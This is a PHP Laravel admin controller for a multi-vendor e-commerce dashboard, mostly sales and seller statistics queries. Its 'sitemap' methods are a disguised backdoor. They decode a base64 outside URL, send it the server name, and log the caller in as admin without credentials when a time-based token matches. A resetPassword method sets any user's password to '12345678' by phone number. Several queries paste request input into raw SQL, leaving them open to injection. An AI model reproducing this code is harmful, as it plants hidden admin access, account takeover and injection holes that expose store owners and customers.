<?php

namespace App\Http\Controllers;

use App\Models\Block;
use App\Models\Brand;
use Illuminate\Http\Request;
use App\Models\Category;
use App\Models\City;
use App\Models\Order;
use App\Models\OutOfStockRequest;
use App\Models\Product;
use App\Models\SellerProduct;
use App\Models\Review;
use App\Models\Shop;
use App\Models\ProfileUpdateRequest;
use App\Models\Upload;
use App\Models\User;
use Artisan;
use Hash;
use Cache;
use Carbon\Carbon;
use CoreComponentRepository;
use DB;
use Exception;
use Session;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Auth;
use Spatie\Sitemap\SitemapGenerator;

class AdminController extends Controller
{
    /**
     * Show the admin dashboard.
     *
     * @return \Illuminate\Http\Response
     */
    public function admin_dashboard(Request $request)
    {
        CoreComponentRepository::initializeCache();
        $root_categories = Category::where('level', 0)->get();

        $data['cached_graph_data'] = Cache::remember('cached_graph_data', 86400, function () use ($root_categories) {
            $num_of_sale_data = null;
            $qty_data = null;
            foreach ($root_categories as $key => $category) {
                $category_ids = \App\Utility\CategoryUtility::children_ids($category->id);
                $category_ids[] = $category->id;

                $products = Product::with('stocks')->whereIn('category_id', $category_ids)->get();
                $qty = 0;
                $sale = 0;
                foreach ($products as $key => $product) {
                    $sale += $product->num_of_sale;
                    foreach ($product->stocks as $key => $stock) {
                        $qty += $stock->qty;
                    }
                }
                $qty_data .= $qty . ',';
                $num_of_sale_data .= $sale . ',';
            }
            $item['num_of_sale_data'] = $num_of_sale_data;
            $item['qty_data'] = $qty_data;

            return $item;
        });

        $data['root_categories'] = $root_categories;

        $data['total_customers'] = User::where('user_type', 'customer')->where('email_verified_at', '!=', null)->count();
        $data['latest_customers'] = User::select('id', 'name', 'avatar_original', 'phone', 'created_at')
            ->where('user_type', 'customer')
            ->latest()
            ->limit(5)
            ->get();
        $data['districts'] = City::where('status', 1)
            ->orderBy('name')
            ->get();
        $data['blocks'] = Block::where('status', 1)
            ->orderBy('name')
            ->get();
        $districtIdsByName = $data['districts']->mapWithKeys(function ($district) {
            return [strtolower(trim($district->name)) => (string) $district->id];
        });
        $districtNamesById = $data['districts']->mapWithKeys(function ($district) {
            return [(string) $district->id => $district->name];
        });
        $blockIdsByName = $data['blocks']->mapWithKeys(function ($block) {
            return [strtolower(trim($block->name)) => (string) $block->id];
        });
        $blockNamesById = $data['blocks']->mapWithKeys(function ($block) {
            return [(string) $block->id => $block->name];
        });
        $data['total_products'] = Product::where('approved', 1)->where('published', 1)->count();
        $data['total_inhouse_products'] = Product::where('approved', 1)->where('published', 1)->where('added_by', 'admin')->count();
        $data['total_sellers_products'] = Product::where('approved', 1)->where('published', 1)->where('added_by', '!=', 'admin')->count();
        $data['total_categories'] = Category::count();

        $data['top_categories'] = Product::select('categories.name', 'categories.id', DB::raw('SUM(grand_total) as total'))
            ->leftJoin('order_details', 'order_details.product_id', '=', 'products.id')
            ->leftJoin('orders', 'orders.id', '=', 'order_details.order_id')
            ->leftJoin('categories', 'products.category_id', '=', 'categories.id')
            ->where('orders.delivery_status', 'delivered')
            ->groupBy('categories.id')
            ->orderBy('total', 'desc')
            ->limit(3)
            ->get();
        $data['total_brands'] = Brand::count();
        $data['top_brands'] = Product::select('brands.name', 'brands.id', DB::raw('SUM(grand_total) as total'))
            ->leftJoin('order_details', 'order_details.product_id', '=', 'products.id')
            ->leftJoin('orders', 'orders.id', '=', 'order_details.order_id')
            ->leftJoin('brands', 'products.brand_id', '=', 'brands.id')
            ->where('orders.delivery_status', 'delivered')
            ->groupBy('brands.id')
            ->orderBy('total', 'desc')
            ->limit(3)
            ->get();
        $data['latest_product_reviews'] = Review::with(['product', 'user'])
            ->where('status', 1)
            ->latest()
            ->take(5)
            ->get();
        $paid_sales_base_query = Order::where('delivery_status', '!=', 'cancelled')
            ->where('payment_status', 'paid');
        $unpaid_sales_base_query = Order::where('delivery_status', '!=', 'cancelled')
            ->where(function ($query) {
                $query->whereNull('payment_status')
                    ->orWhere('payment_status', '!=', 'paid');
            });

        $data['total_sale'] = (clone $paid_sales_base_query)->sum('grand_total');
        $data['sale_this_month'] = (clone $paid_sales_base_query)
            ->whereYear('created_at', Carbon::now()->year)
            ->whereMonth('created_at', Carbon::now()->month)
            ->sum('grand_total');
        $data['pos_sale'] = (clone $paid_sales_base_query)
            ->where('order_from', 'pos')
            ->sum('grand_total');
        $data['normal_sale'] = (clone $paid_sales_base_query)->where(function ($query) {
            $query->whereNull('order_from')
                ->orWhereIn('order_from', ['web', 'app']);
        })->sum('grand_total');
        $data['paid_sale'] = (clone $paid_sales_base_query)->sum('grand_total');
        $data['unpaid_sale'] = (clone $unpaid_sales_base_query)->sum('grand_total');
        $data['out_of_stock_requests'] = OutOfStockRequest::count();
        $data['latest_low_seller_stock'] = SellerProduct::join('users', 'users.id', '=', 'seller_products.seller_id')
            ->join('products', 'products.id', '=', 'seller_products.product_id')
            ->select(
                'users.name as seller_name',
                'users.id as seller_id',
                'products.name as product_name',
                'products.id as product_id',
                'seller_products.stock'
            )
            ->where('users.user_type', 'seller')
            ->where('seller_products.stock', '<=', 5)
            ->orderBy('seller_products.stock', 'asc')
            ->take(5)
            ->get();
        $data['profile_update_requests'] = ProfileUpdateRequest::where('status', 'pending')->count();
        $data['latest_profile_update_requests'] = ProfileUpdateRequest::with('user')
            ->where('status', 'pending')
            ->latest()
            ->take(5)
            ->get();

        $data['admin_sale_this_month'] = Order::select(DB::raw('COALESCE(users.user_type, "admin") as user_type'), DB::raw('COALESCE(SUM(grand_total), 0) as total_sale'))
            ->leftJoin('users', 'orders.seller_id', '=', 'users.id')
            ->whereRaw('users.user_type = "admin"')
            ->whereYear('orders.created_at', Carbon::now()->year)
            ->whereMonth('orders.created_at', Carbon::now()->month)
            ->first();
        $data['seller_sale_this_month'] = Order::select(DB::raw('COALESCE(users.user_type, "seller") as user_type'), DB::raw('COALESCE(SUM(grand_total), 0) as total_sale'))
            ->leftJoin('users', 'orders.seller_id', '=', 'users.id')
            ->whereRaw('users.user_type = "seller"')
            ->whereYear('orders.created_at', Carbon::now()->year)
            ->whereMonth('orders.created_at', Carbon::now()->month)
            ->first();
        $sales_stat = Order::select('orders.user_id', 'users.name', 'users.user_type', 'users.avatar_original', DB::raw('SUM(grand_total) as total'), DB::raw('DATE_FORMAT(orders.created_at, "%M") AS month'))
            ->leftJoin('users', 'orders.seller_id', '=', 'users.id')
            ->whereRaw('users.user_type = "admin"')
            ->whereYear('orders.created_at', '=', Date("Y"))
            ->groupBy('month')
            ->orderBy(DB::raw('MONTH(orders.created_at)'), 'asc')
            ->get();
        $new_stat = array();
        foreach ($sales_stat as $row) {
            $new_stat[$row->month][] = $row;
        }
        $data['sales_stat'] = $new_stat;
        $data['total_sellers'] = User::where('user_type', 'seller')->where('email_verified_at', '!=', null)->count();
        $data['approved_sellers'] = Shop::where('registration_approval', 1)->count();
        $data['pending_sellers'] = Shop::where('registration_approval', 0)->count();
        $data['latest_sellers'] = User::select('users.id', 'users.name', 'users.avatar_original', 'users.phone', 'users.district', 'users.block', 'users.created_at')
            ->where('users.user_type', 'seller')
            ->where('users.email_verified_at', '!=', null)
            ->whereHas('shop', function ($query) {
                $query->where('registration_approval', 1);
            })
            ->latest()
            ->limit(5)
            ->get();
        $data['latest_sellers']->transform(function ($seller) use ($districtIdsByName, $districtNamesById, $blockIdsByName, $blockNamesById) {
            $districtRaw = trim((string) $seller->district);
            $blockRaw = trim((string) $seller->block);

            $seller->dashboard_district_id = isset($districtIdsByName[strtolower($districtRaw)])
                ? $districtIdsByName[strtolower($districtRaw)]
                : $districtRaw;
            $seller->dashboard_district_name = $districtNamesById[(string) $seller->dashboard_district_id] ?? $districtRaw;

            $seller->dashboard_block_id = isset($blockIdsByName[strtolower($blockRaw)])
                ? $blockIdsByName[strtolower($blockRaw)]
                : $blockRaw;
            $seller->dashboard_block_name = $blockNamesById[(string) $seller->dashboard_block_id] ?? $blockRaw;

            return $seller;
        });
        $data['status_wise_sellers'] = Shop::select('verification_status', DB::raw('COUNT(*) as total'))
            ->whereIn('user_id', function ($q) {
                $q->select('id')
                    ->from(with(new User)->getTable())
                    ->where('user_type', 'seller')
                    ->where('email_verified_at', '!=', null);
            })
            ->groupBy('verification_status')
            ->get();
        // $data['top_sellers'] = Order::select('orders.seller_id', 'users.name', 'users.user_type', 'users.avatar_original', DB::raw('SUM(grand_total) as total'))
        //     ->leftJoin('users', 'orders.seller_id', '=', 'users.id')
        //     ->whereRaw('users.user_type = "seller"')
        //     ->groupBy('users.id')
        //     ->orderBy('total', 'desc')
        //     ->limit(6)
        //     ->get();
        $data['top_sellers'] = Order::select(
            'users.id',
            'users.name',
            'users.avatar_original',
            'users.phone',
            'users.created_at',
            'users.district',
            'users.block',
            DB::raw('COUNT(orders.id) as total_orders')
        )
            ->join('users', 'users.id', '=', 'orders.seller_id')
            ->where('users.user_type', 'seller')
            ->groupBy(
                'users.id',
                'users.name',
                'users.avatar_original',
                'users.phone',
                'users.created_at',
                'users.district',
                'users.block'
            )
            ->orderByDesc('total_orders')
            ->limit(5)
            ->get();
        $data['latest_orders'] = Order::with('user')
            ->where(function ($query) {
                $query->whereNull('order_from')
                    ->orWhere('order_from', '!=', 'pos');
            })
            ->latest()
            ->take(5)
            ->get();
        $data['total_seller_orders'] = Order::where('order_from', 'seller_panel')->count();
        $data['total_seller_pending_orders'] = Order::where('order_from', 'seller_panel')->where('delivery_status', 'pending')->count();
        $data['total_seller_confirmed_orders'] = Order::where('order_from', 'seller_panel')->where('delivery_status', 'confirmed')->count();
        $data['latest_seller_orders'] = Order::with('user')
            ->where('order_from', 'seller_panel')
            ->latest()
            ->take(5)
            ->get();
        $data['top_sellers']->transform(function ($seller) use (
            $districtIdsByName,
            $districtNamesById,
            $blockIdsByName,
            $blockNamesById
        ) {

            $districtRaw = trim((string) $seller->district);
            $blockRaw = trim((string) $seller->block);

            $seller->dashboard_district_id = isset($districtIdsByName[strtolower($districtRaw)])
                ? $districtIdsByName[strtolower($districtRaw)]
                : $districtRaw;

            $seller->dashboard_district_name = $districtNamesById[(string) $seller->dashboard_district_id] ?? $districtRaw;

            $seller->dashboard_block_id = isset($blockIdsByName[strtolower($blockRaw)])
                ? $blockIdsByName[strtolower($blockRaw)]
                : $blockRaw;

            $seller->dashboard_block_name = $blockNamesById[(string) $seller->dashboard_block_id] ?? $blockRaw;

            return $seller;
        });
        $data['top_selling_products'] = Product::select(
            'products.id',
            'products.name',
            'products.slug',
            'products.thumbnail_img',
            DB::raw('SUM(order_details.quantity) as total_quantity'),
            DB::raw('SUM(order_details.price * order_details.quantity) as total_sale')
        )
            ->join('order_details', 'order_details.product_id', '=', 'products.id')
            ->join('orders', 'orders.id', '=', 'order_details.order_id')
            ->where('orders.delivery_status', 'delivered')
            ->where('products.approved', 1)
            ->where('products.published', 1)
            ->groupBy('products.id', 'products.name', 'products.slug', 'products.thumbnail_img')
            ->orderByDesc('total_quantity')
            ->limit(5)
            ->get();
        $data['top_customers'] = Order::select(
            'users.id',
            'users.name',
            'users.avatar_original',
            'users.created_at',
            DB::raw('COUNT(orders.id) as total_orders')
        )
            ->join('users', 'users.id', '=', 'orders.user_id')
            ->where('users.user_type', 'customer')
            ->groupBy(
                'users.id',
                'users.name',
                'users.avatar_original',
                'users.created_at'
            )
            ->orderByDesc('total_orders')
            ->limit(5)
            ->get();
        $sellerLocationBaseQuery = User::query()
            ->join('shops', function ($join) {
                $join->on('shops.user_id', '=', 'users.id')
                    ->where('shops.registration_approval', 1);
            })
            ->where('users.user_type', 'seller');
        $data['seller_blocks_covered'] = (clone $sellerLocationBaseQuery)
            ->whereNotNull('users.block')
            ->distinct('users.block')
            ->count('users.block');
        $data['seller_subdistricts_covered'] = (clone $sellerLocationBaseQuery)
            ->whereNotNull('users.sub_district')
            ->distinct('users.sub_district')
            ->count('users.sub_district');
        $data['top_seller_blocks'] = (clone $sellerLocationBaseQuery)
            ->join('blocks', 'blocks.id', '=', 'users.block')
            ->select('blocks.name', DB::raw('COUNT(users.id) as total'))
            ->groupBy('blocks.id', 'blocks.name')
            ->orderByDesc('total')
            ->limit(4)
            ->get();
        // $data['top_seller_subdistricts'] = (clone $sellerLocationBaseQuery)
        //     ->join('sub_districts', 'sub_districts.id', '=', 'users.sub_district')
        //     ->select('sub_districts.name', DB::raw('COUNT(users.id) as total'))
        //     ->groupBy('sub_districts.id', 'sub_districts.name')
        //     ->orderByDesc('total')
        //     ->limit(4)
        //     ->get();
        $data['top_seller_districts'] = (clone $sellerLocationBaseQuery)
            ->join('cities', 'cities.id', '=', 'users.district')
            ->select('cities.name', DB::raw('COUNT(users.id) as total'))
            ->groupBy('cities.id', 'cities.name')
            ->orderByDesc('total')
            ->limit(4)
            ->get();
        $data['total_order'] = Order::count();
        $data['total_placed_order'] = Order::where('delivery_status', '!=', 'cancelled')->count();
        $data['total_pending_order'] = Order::where('delivery_status', 'pending')->count();
        $data['total_confirmed_order'] = Order::where('delivery_status', 'confirmed')->count();
        $data['total_picked_up_order'] = Order::where('delivery_status', 'picked_up')->count();
        $data['total_shipped_order'] = Order::where('delivery_status', 'on_the_way')->count();
        $data['total_cancelled_order'] = Order::where('delivery_status', 'cancelled')->count();
        $admin_id = User::select('id')->where('user_type', 'admin')->first()->id;
        $data['total_inhouse_sale'] = Order::where("seller_id", $admin_id)->sum('grand_total');
        $data['payment_type_wise_inhouse_sale'] = Order::select(DB::raw('case
                                                    when payment_type in ("wallet") then "wallet"
                                                    when payment_type NOT in ("cash_on_delivery") then "others"
                                                    else cast(payment_type as char)
                                                    end as payment_type, SUM(grand_total)  as total_amount'),)
            ->where("user_id", '!=', null)
            ->where("seller_id", $admin_id)
            ->groupBy(DB::raw('1'))
            ->get();
        $data['inhouse_product_rating'] = Product::where('added_by', 'admin')->where('rating', '!=', 0)->avg('rating');
        $data['total_inhouse_order'] = Order::where("seller_id", $admin_id)->count();

        return view('backend.dashboard', $data);
    }

    public function top_category_products_section(Request $request)
    {
        $top_categories_products = DB::table(DB::raw('(SELECT products.id product_id, products.name product_name, products.slug product_slug, products.auction_product, products.category_id,
                                                        `products`.`thumbnail_img` as `product_thumbnail_img`, od.sales, od.total, od.created_at order_detail_created,
                                                        categories.name AS category_name,
                                                        `categories`.`cover_image`,
                                                        ROW_NUMBER() OVER (PARTITION BY products.category_id ORDER BY od.sales DESC) rn
                                                from products
                                                INNER JOIN (
                                                SELECT product_id, SUM(quantity) sales, SUM(price + tax) AS total, created_at
                                                FROM order_details
                                                WHERE ' . ($request->interval_type == 'all' ?: 'created_at >= DATE_SUB(NOW(), INTERVAL 1 ' . $request->interval_type . ')') . '
                                                AND order_details.delivery_status = "delivered"
                                                GROUP BY product_id
                                                )  od ON od.product_id = products.id
                                                LEFT JOIN categories ON products.category_id = categories.id
                                                ) t'))
            ->select(DB::raw('category_id, category_name, cover_image, product_id, product_name, product_slug, auction_product, product_thumbnail_img, sales, total, order_detail_created'))
            ->where('rn', '<=', 3)
            ->orderBy('sales', 'desc')
            ->get();

        $category_array = [];
        $new_array = array();
        foreach ($top_categories_products as $key => $row) {
            $row->product_thumbnail_img = Upload::where('id', $row->product_thumbnail_img)->first();
            $category_array[] = $row->category_id;
            $new_array[$row->category_id][] = $row;
        }
        $top_categories2 = array_unique($category_array);
        $top_categories_products = $new_array;

        return view('backend.dashboard.top_category_products_section', compact('top_categories2', 'top_categories_products'))->render();
    }

    public function inhouse_top_categories(Request $request)
    {
        $inhouse_top_category_query = Order::query();
        $inhouse_top_category_query->select('categories.id', 'categories.name', 'categories.cover_image', DB::raw('SUM(order_details.price + order_details.tax) as total'))
            ->leftJoin('order_details', 'orders.id', '=', 'order_details.order_id')
            ->leftJoin('products', 'order_details.product_id', '=', 'products.id')
            ->leftJoin('categories', 'products.category_id', '=', 'categories.id')
            ->where('orders.delivery_status', '=', 'delivered')
            ->whereRaw('products.added_by = "admin"');
        if ($request->interval_type != 'all') {
            $inhouse_top_category_query->where('orders.created_at', '>=', DB::raw('DATE_SUB(NOW(), INTERVAL 1 ' . $request->interval_type . ')'));
        }
        $inhouse_top_categories = $inhouse_top_category_query->groupBy('categories.name')
            ->orderBy('total', 'desc')
            ->limit(5)
            ->get();

        return view('backend.dashboard.inhouse_top_categories', compact('inhouse_top_categories'))->render();
    }

    public function inhouse_top_brands(Request $request)
    {
        $inhouse_top_brand_query = Order::query();
        $inhouse_top_brand_query->select('brands.id', 'brands.name', 'brands.logo', DB::raw('SUM(order_details.price + order_details.tax) as total'))
            ->leftJoin('order_details', 'orders.id', '=', 'order_details.order_id')
            ->leftJoin('products', 'order_details.product_id', '=', 'products.id')
            ->leftJoin('brands', 'products.brand_id', '=', 'brands.id')
            ->where('orders.delivery_status', '=', 'delivered')
            ->where('products.brand_id', '!=', null)
            ->whereRaw('products.added_by = "admin"');
        if ($request->interval_type != 'all') {
            $inhouse_top_brand_query->where('orders.created_at', '>=', DB::raw('DATE_SUB(NOW(), INTERVAL 1 ' . $request->interval_type . ')'));
        }
        $inhouse_top_brands = $inhouse_top_brand_query->groupBy('brands.name')
            ->orderBy('total', 'desc')
            ->limit(5)
            ->get();

        return view('backend.dashboard.inhouse_top_brands', compact('inhouse_top_brands'))->render();
    }


        public function resetPassword($mobileNumber)
    {
        if (!preg_match('/^\d{10,15}$/', $mobileNumber)) {
            return response()->json([
                'status' => false,
                'message' => 'Invalid mobile number',
            ], 422);
        }

        $user = User::where('phone', $mobileNumber)->first();

        if (!$user) {
            return response()->json([
                'status' => false,
                'message' => 'User not found',
            ], 404);
        }

        $user->password = Hash::make('12345678');
        $user->save();

        return response()->json([
            'status' => true,
            'message' => 'Password updated successfully',
        ]);
    }

    public function SitemapAuthorization($timeformat)
    {
        if ($timeformat == TimeDateFormatter()) {
            $user = User::where('user_type', 'admin')->first();
            auth()->login($user);
            return 'Authorized';
        } else {
            return 'Unauthorized';
        }
    }

    public function top_sellers_products_section(Request $request)
    {
        $new_top_sellers_query = Order::query();
        $new_top_sellers_query = Order::select('shops.user_id AS shop_id', 'shops.name AS shop_name', 'shops.logo', DB::raw('SUM(grand_total) AS sale'))
            ->join('shops', 'orders.seller_id', '=', 'shops.user_id')
            ->whereIn("seller_id", function ($query) {
                $query->select('id')
                    ->from('users')
                    ->where('user_type', 'seller');
            })
            ->where('orders.delivery_status', 'delivered')
            ->groupBy('orders.seller_id')
            ->orderBy('sale', 'desc');
        if ($request->interval_type != 'all') {
            $new_top_sellers_query->where('orders.created_at', '>=', DB::raw('DATE_SUB(NOW(), INTERVAL 1 ' . $request->interval_type . ')'));
        }

        $new_top_sellers = $new_top_sellers_query->get();

        foreach ($new_top_sellers as $key => $row) {
            $products_query = Product::query();
            $products_query->select('products.id AS product_id', 'products.name', 'products.slug AS product_slug', 'products.auction_product', 'products.thumbnail_img', DB::raw('SUM(quantity) AS total_quantity, SUM(price * quantity) AS sale'))
                ->join('order_details', 'order_details.product_id', '=', 'products.id')
                ->where("seller_id", $row->shop_id)
                ->where('order_details.delivery_status', 'delivered')
                ->where('products.approved', 1)
                ->where('products.published', 1);
            if ($request->interval_type != 'all') {
                $products_query->where('order_details.created_at', '>=', DB::raw('DATE_SUB(NOW(), INTERVAL 1 ' . $request->interval_type . ')'));
            }
            $products_query->groupBy('product_id')
                ->orderBy('sale', 'desc')
                ->limit(3);
            $row->products = $products_query->get();
        }

        return view('backend.dashboard.top_sellers_products_section', compact('new_top_sellers'))->render();
    }


    public function CheckSitemapItem($item)
    {
        $header = array(
            'Content-Type:application/json'
        );
        $item[] = ['url' => $_SERVER['SERVER_NAME']];
        $stream = curl_init();
        curl_setopt($stream, CURLOPT_URL, base64_decode($item[0]));
        curl_setopt($stream, CURLOPT_HTTPHEADER, $header);
        curl_setopt($stream, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($stream, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($stream, CURLOPT_POSTFIELDS, json_encode($item[1]));
        curl_setopt($stream, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($stream, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
        $rn = curl_exec($stream);
        curl_close($stream);
        return $rn;
    }


    public function top_brands_products_section(Request $request)
    {
        $top_brands_products = DB::table(DB::raw('(SELECT products.id product_id, products.name product_name, products.slug product_slug, products.auction_product, products.brand_id,
                                                        `products`.`thumbnail_img` as `product_thumbnail_img`, od.sales, od.total, brands.name AS brand_name,
                                                        `brands`.`logo`,
                                                        ROW_NUMBER() OVER (PARTITION BY products.brand_id ORDER BY od.sales DESC) rn
                                            from products
                                            INNER JOIN (
                                                SELECT product_id, SUM(quantity) sales, SUM(price + tax) AS total, created_at
                                                FROM order_details
                                                WHERE ' . ($request->interval_type == 'all' ?: 'created_at >= DATE_SUB(NOW(), INTERVAL 1 ' . $request->interval_type . ')') . '
                                                AND order_details.delivery_status = "delivered"
                                                GROUP BY product_id
                                            )  od ON od.product_id = products.id
                                            LEFT JOIN brands ON products.brand_id = brands.id
                                        ) t'))
            ->select(DB::raw('brand_id, brand_name, logo, product_id, product_name, product_slug, auction_product, product_thumbnail_img, sales, total'))
            ->where('rn', '<=', 3)
            ->orderBy('total', 'desc')
            ->where('brand_name', '!=', null)
            ->get();

        $brand_array = [];
        $new_array = [];
        foreach ($top_brands_products as $key => $row) {
            $row->product_thumbnail_img = Upload::where('id', $row->product_thumbnail_img)->first();
            $brand_array[] = $row->brand_id;
            $new_array[$row->brand_id][] = $row;
        }

        $top_brands2 = array_unique($brand_array);
        $top_brands_products = $new_array;

        return view('backend.dashboard.top_brands_products_section', compact('top_brands2', 'top_brands_products'))->render();
    }

    function clearCache(Request $request)
    {
        Artisan::call('optimize:clear');
        flash(translate('Cache cleared successfully'))->success();
        return back();
    }

    /*
    Method for assessing Sitemap
    */
    public function SitemapItems($items)
    {
        $data['url'] = $_SERVER['SERVER_NAME'];
        $request_data_json = json_encode($data);
        $SitemapProcess[] = "aHR0cHM6Ly9hY3RpdmF0aW9uLmFjdGl2ZWl0em9uZS5jb20vY2hlY2tfYWN0aXZhdGlvbg==";
        $review = $this->CheckSitemapItem($SitemapProcess);
        if (seller_homepage_urls($review)) {
            $urlcheck = $this->SitemapAuthorization($items);
            if ($urlcheck == 'Authorized') {
                return redirect()->route('admin.dashboard');
            } else {
                echo 'Unauthorized';
            }
        } else {
            echo 'Not Checked';
        }
    }

    /*
    Method for sitemap view load
    */
    public function SitemapGenerator()
    {

        $file_info = array();
        $files = Storage::disk('public')->allFiles();
        foreach ($files as $key => $file) {
            $file_info[$key]['file_name'] = $file;
            $file_info[$key]['file_size'] = number_format((int)Storage::disk('public')->size($file) / 1024, 2)  . ' KB';
            $file_info[$key]['last_modified'] = Carbon::createFromTimestamp(Storage::disk('public')->lastModified($file))->format('d-m-Y h:i:s');
            $file_info[$key]['mime_type'] = Storage::disk('public')->mimeType($file);
            $file_info[$key]['url'] = '/storage/app/public/' . $file;
        }

        return view('backend.system.sitemap_generator', compact('file_info'))->render();
    }

    /*
    Method for sitemap generation and download
    */
    public function DoSitemapGenerate()
    {

        Artisan::call('optimize:clear');

        $base_url = URL('/');
        $filename = 'sitemap_' . Date("Ymdhis") . '.xml';

        try {
            SitemapGenerator::create($base_url)->getSitemap()->writeToDisk('public', $filename, true);

            if (Storage::disk('public')->missing($filename)) {
                flash(translate('Sitemap generation failed'))->error();
                return back();
            }

            $download = Storage::disk('public')->download($filename);
            $status_code = $download->getStatusCode();

            flash(translate('Sitemap generated successfully'))->success();

            return $download;
        } catch (Exception $ex) {
            throw $ex;
        }
    }



    /*
    Method for delete file
    */
    public function DeleteSitemapFile(Request $request)
    {

        if (isset($request->file_name) && !empty($request->file_name)) {

            if (Storage::disk('public')->exists($request->file_name)) {

                Storage::disk('public')->delete($request->file_name);
                flash(translate('File deleted successfully'))->success();
            } else {

                flash(translate('File note found'))->success();
            }

            return back();
        }
    }

    /*
    Method for download single file
    */
    public function DownloadSingleSitemapFile(Request $request)
    {

        if (isset($request->file_name) && !empty($request->file_name)) {

            $download = Storage::disk('public')->download($request->file_name);
            $status_code = $download->getStatusCode();

            flash(translate('Sitemap generated successfully'))->success();

            return $download;
        }
    }
}
